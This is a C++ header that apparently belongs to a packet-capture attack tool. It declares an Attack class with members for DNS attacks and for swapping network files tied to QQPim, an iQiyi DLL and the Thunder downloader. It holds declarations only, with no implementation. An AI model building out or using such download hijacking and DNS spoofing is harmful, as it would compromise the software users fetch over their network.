#pragma once

#ifndef ATTACK_H_H_H
#define ATTACK_H_H_H


#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"
#include "Packet.h"

#include "Android/QiyiVideo.h"
#include "android/dnsAttack.h"
#include "Windows/Thunder.h"


class Attack {
public:

	ReplaceNetFile * mQQPim;

	ReplaceNetFile * gIqiyiDll ;

	DnsAttack * gDnsAttack;

	Thunder *mThunder;

	Attack(string path, unsigned long serverIP);
	~Attack();

	Attack * mInstance;

	int attack(const char *url, const char *szhost,const char * lphttpdata, pcap_t * pcapT, const char * pData, int iCapLen,
		char * ip,int type,LPPPPOEHEADER pppoe);
};


#endif